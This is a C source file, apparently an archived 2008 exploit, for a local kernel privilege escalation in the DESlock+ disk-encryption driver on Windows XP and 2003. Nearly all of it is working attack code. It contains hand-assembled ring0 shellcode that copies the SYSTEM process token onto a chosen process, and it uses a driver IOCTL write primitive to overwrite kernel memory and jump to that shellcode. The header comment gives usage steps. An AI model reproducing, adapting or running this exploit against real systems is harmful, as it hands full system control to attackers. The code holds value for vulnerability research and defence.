/* deslock-pown-v2.c
 *
 * Copyright (c) 2008 by <mu-b@digit-labs.org>
 *
 * DESlock+ <= 3.2.6 local kernel ring0 SYSTEM exploit
 * by mu-b - Wed 26 Dec 2007
 *
 * - Tested on: DLMFDISK.sys 1.2.0.27
 *              - Microsoft Windows 2003 SP2
 *              - Microsoft Windows XP SP2
 *
 * Note: create a mountable filesystem (size/password is irrelevant),
 * name the pseudo-filesystem "XXXAAAA.mnt" and copy to "?:\",
 * finally mount the pseudo-filesystem and ./deslock-pown-v2 for SYSTEM.
 *
 * Compile: MinGW + -lntdll
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2008!@$!
 */

#include <stdio.h>
#include <stdlib.h>

#include <windows.h>
#include <ddk/ntapi.h>

#define DLKFDISK_IOCTL    0x80002024
#define DLKFDISK_R_IOCTL  0x80002010
#define DLKFDISK_SLOT     0x00000C5A
#define DLKFDISK_OFFSET   0x0D
#define DLKFDISK_DISK_MAX 0x1A

static unsigned char win32_fixup[] =
  "\x53"
  "\xeb\x0e"
  /* _fixup_copy  */
  "\x5e"
  "\xbf\x5c\x0c\x00\x00"
  "\x31\xc9"
  "\xb1\x05"
  "\xf3\xa5"
  "\xeb\x19"
  /* _fixup_blk   */
  "\xe8\xed\xff\xff\xff"
  "\x64\x0a\x00\x00"
  "\xd3\x0a\x00\x00"
  "\x2a\x0a\x00\x00"
  "\x49\x0a\x00\x00"
  "\x68\x0b\x00\x00";

/* Win2k3 SP1/2 - kernel EPROCESS token switcher
 * by mu-b <mu-b@digit-lab.org>
 */
static unsigned char win2k3_ring0_shell[] =
  /* _ring0 */
  "\xb8\x24\xf1\xdf\xff"
  "\x8b\x00"
  "\x8b\xb0\x18\x02\x00\x00"
  "\x89\xf0"
  /* _sys_eprocess_loop   */
  "\x8b\x98\x94\x00\x00\x00"
  "\x81\xfb\x04\x00\x00\x00"
  "\x74\x11"
  "\x8b\x80\x9c\x00\x00\x00"
  "\x2d\x98\x00\x00\x00"
  "\x39\xf0"
  "\x75\xe3"
  "\xeb\x21"
  /* _sys_eprocess_found  */
  "\x89\xc1"
  "\x89\xf0"

  /* _cmd_eprocess_loop   */
  "\x8b\x98\x94\x00\x00\x00"
  "\x81\xfb\x00\x00\x00\x00"
  "\x74\x10"
  "\x8b\x80\x9c\x00\x00\x00"
  "\x2d\x98\x00\x00\x00"
  "\x39\xf0"
  "\x75\xe3"
  /* _not_found           */
  "\xcc"
  /* _cmd_eprocess_found
   * _ring0_end           */

  /* copy tokens!$%!      */
  "\x8b\x89\xd8\x00\x00\x00"
  "\x89\x88\xd8\x00\x00\x00"
  "\x90";

static unsigned char winxp_ring0_shell[] =
  /* _ring0 */
  "\xb8\x24\xf1\xdf\xff"
  "\x8b\x00"
  "\x8b\x70\x44"
  "\x89\xf0"
  /* _sys_eprocess_loop   */
  "\x8b\x98\x84\x00\x00\x00"
  "\x81\xfb\x04\x00\x00\x00"
  "\x74\x11"
  "\x8b\x80\x8c\x00\x00\x00"
  "\x2d\x88\x00\x00\x00"
  "\x39\xf0"
  "\x75\xe3"
  "\xeb\x21"
  /* _sys_eprocess_found  */
  "\x89\xc1"
  "\x89\xf0"

  /* _cmd_eprocess_loop   */
  "\x8b\x98\x84\x00\x00\x00"
  "\x81\xfb\x00\x00\x00\x00"
  "\x74\x10"
  "\x8b\x80\x8c\x00\x00\x00"
  "\x2d\x88\x00\x00\x00"
  "\x39\xf0"
  "\x75\xe3"
  /* _not_found           */
  "\xcc"
  /* _cmd_eprocess_found
   * _ring0_end           */

  /* copy tokens!$%!      */
  "\x8b\x89\xc8\x00\x00\x00"
  "\x89\x88\xc8\x00\x00\x00"
  "\x90";

static unsigned char win32_ret[] =
  "\x5b"
  "\x31\xff"
  "\xb8\xdc\x0b\x00\x00"
  "\xff\xe0"
  "\xcc";

struct ioctl_req {
  void *arg[20];
};

static PCHAR
fixup_ring0_shell (PVOID base, DWORD ppid, DWORD *zlen)
{
  DWORD dwVersion, dwMajorVersion, dwMinorVersion;

  dwVersion = GetVersion ();
  dwMajorVersion = (DWORD) (LOBYTE(LOWORD(dwVersion)));
  dwMinorVersion = (DWORD) (HIBYTE(LOWORD(dwVersion)));

  if (dwMajorVersion != 5)
    {
      fprintf (stderr, "* GetVersion, unsupported version\n");
      exit (EXIT_FAILURE);
    }

  *(PDWORD) &win32_fixup[5]  += (DWORD) base;
  *(PDWORD) &win32_fixup[22] += (DWORD) base;
  *(PDWORD) &win32_fixup[26] += (DWORD) base;
  *(PDWORD) &win32_fixup[30] += (DWORD) base;
  *(PDWORD) &win32_fixup[34] += (DWORD) base;
  *(PDWORD) &win32_fixup[38] += (DWORD) base;

  *(PDWORD) &win32_ret[4] += (DWORD) base;

  switch (dwMinorVersion)
    {
      case 1:
        *zlen = sizeof winxp_ring0_shell - 1;
        *(PDWORD) &winxp_ring0_shell[55] = ppid;
        return (winxp_ring0_shell);

      case 2:
        *zlen = sizeof win2k3_ring0_shell - 1;
        *(PDWORD) &win2k3_ring0_shell[58] = ppid;
        return (win2k3_ring0_shell);

      default:
        fprintf (stderr, "* GetVersion, unsupported version\n");
        exit (EXIT_FAILURE);
    }

  return (NULL);
}

static PVOID
get_module_base (void)
{
  PSYSTEM_MODULE_INFORMATION_ENTRY pModuleBase;
  PSYSTEM_MODULE_INFORMATION pModuleInfo;
  DWORD i, num_modules, status, rlen;
  PVOID result;

  status = NtQuerySystemInformation (SystemModuleInformation, NULL, 0, &rlen);
  if (status != STATUS_INFO_LENGTH_MISMATCH)
    {
      fprintf (stderr, "* NtQuerySystemInformation failed, 0x%08X\n", status);
      exit (EXIT_FAILURE);
    }

  pModuleInfo = (PSYSTEM_MODULE_INFORMATION) HeapAlloc (GetProcessHeap (), HEAP_ZERO_MEMORY, rlen);

  status = NtQuerySystemInformation (SystemModuleInformation, pModuleInfo, rlen, &rlen);
  if (status != STATUS_SUCCESS)
    {
      fprintf (stderr, "* NtQuerySystemInformation failed, 0x%08X\n", status);
      exit (EXIT_FAILURE);
    }

  num_modules = pModuleInfo->Count;
  pModuleBase = &pModuleInfo->Module[0];
  result = NULL;

  for (i = 0; i < num_modules; i++, pModuleBase++)
    if (strstr (pModuleBase->ImageName, "dlkfdisk.sys"))
      {
        result = pModuleBase->Base;
        break;
      }

  HeapFree (GetProcessHeap (), HEAP_NO_SERIALIZE, pModuleInfo);

  return (result);
}

int
main (int argc, char **argv)
{
  struct ioctl_req req;
  DWORD disk_no, i, rlen, zlen, ppid;
  CHAR rbuf[64], sbuf[512];
  LPVOID zpage, zbuf, base;
  HANDLE hFile;
  BOOL result;

  printf ("DESlock+ <= 3.2.6 local kernel ring0 SYSTEM exploit\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n");

  if (argc <= 1)
    {
      fprintf (stderr, "Usage: %s <processid to elevate>\n", argv[0]);
      exit (EXIT_SUCCESS);
    }

  ppid = atoi (argv[1]);

  hFile = CreateFileA ("\\\\.\\DLKFDisk_Control", FILE_EXECUTE,
                       FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
                       OPEN_EXISTING, 0, NULL);
  if (hFile == INVALID_HANDLE_VALUE)
    {
      fprintf (stderr, "* CreateFileA failed, %d\n", hFile);
      exit (EXIT_FAILURE);
    }

  for (i = 0; i < DLKFDISK_DISK_MAX; i++)
    {
      memset (&req, 0, sizeof req);
      req.arg[0] = (void *) 0xDEADBEEF;
      req.arg[1] = (void *) 0xDEADBEEF;
      req.arg[2] = (void *) 0xDEADBEEF;
      req.arg[3] = (void *) i;            /* drive number   */
      req.arg[4] = (void *) sizeof sbuf;  /* buffer size    */
      req.arg[5] = (void *) sbuf;         /* buffer pointer */

      result = DeviceIoControl (hFile, DLKFDISK_IOCTL,
                                &req, sizeof req, rbuf, sizeof rbuf, &rlen, 0);
      if (!result)
        {
          fprintf (stderr, "* DeviceIoControl failed\n");
          exit (EXIT_FAILURE);
        }

      if (strlen (sbuf + DLKFDISK_OFFSET - 1) > 6 &&
          strcmp (sbuf + DLKFDISK_OFFSET - 1 + 6, ":\\XXXAAAA.mnt") == 0)
        {
          disk_no = i;
          break;
        }
    }
  printf ("* write buf: \"%s\"\n", &sbuf[DLKFDISK_OFFSET - 1]);

  zpage = VirtualAlloc ((LPVOID) 0x41410000, 0x10000,
                        MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  if (zpage == NULL)
    {
      fprintf (stderr, "* VirtualAlloc failed\n");
      exit (EXIT_FAILURE);
    }
  printf ("* allocated page: 0x%08X [%d-bytes]\n",
          zpage, 0x10000);

  base = get_module_base ();
  if (base == NULL)
    {
      fprintf (stderr, "* unable to find dlkfdisk.sys base\n");
      exit (EXIT_FAILURE);
    }
  printf ("* dlkfdisk.sys base: 0x%08X\n", base);

  memset (zpage, 0xCC, 0x10000);
  zbuf = fixup_ring0_shell (base, ppid, &zlen);
  memcpy ((LPVOID) 0x41414141, win32_fixup, sizeof (win32_fixup) - 1);
  memcpy ((LPVOID) (0x41414141 + sizeof (win32_fixup) - 1), zbuf, zlen);
  memcpy ((LPVOID) (0x41414141 + sizeof (win32_fixup) + zlen - 1),
          win32_ret, sizeof (win32_ret) - 1);

  memset (&req, 0, sizeof req);
  req.arg[0] = (void *) 0xDEADBEEF;
  req.arg[1] = (void *) 0xDEADBEEF;
  req.arg[2] = (void *) 0xDEADBEEF;
  req.arg[3] = (void *) disk_no;                                    /* drive number   */
  req.arg[4] = (void *) 512;                                        /* buffer size    */
  req.arg[5] = (void *) (base + DLKFDISK_SLOT - DLKFDISK_OFFSET);   /* buffer pointer */

  printf ("* overwriting [@0x%08X %d-bytes].. ",
          base + DLKFDISK_SLOT, strlen (sbuf + DLKFDISK_OFFSET - 1) + 1);
  result = DeviceIoControl (hFile, DLKFDISK_IOCTL,
                            &req, sizeof req, rbuf, sizeof rbuf, &rlen, 0);
  if (!result)
    {
      fprintf (stderr, "DeviceIoControl failed\n");
      exit (EXIT_FAILURE);
    }
  printf ("done\n");

  /* jump to our address :) */
  printf ("* jumping.. ");
  result = DeviceIoControl (hFile, DLKFDISK_R_IOCTL,
                            &req, sizeof req, rbuf, sizeof rbuf, &rlen, 0);
  if (!result)
    {
      fprintf (stderr, "DeviceIoControl failed\n");
      exit (EXIT_FAILURE);
    }
  printf ("done\n\n"
          "* hmmm, you didn't STOP the box?!?!\n");

  CloseHandle (hFile);

  return (EXIT_SUCCESS);
}

// milw0rm.com [2008-02-18]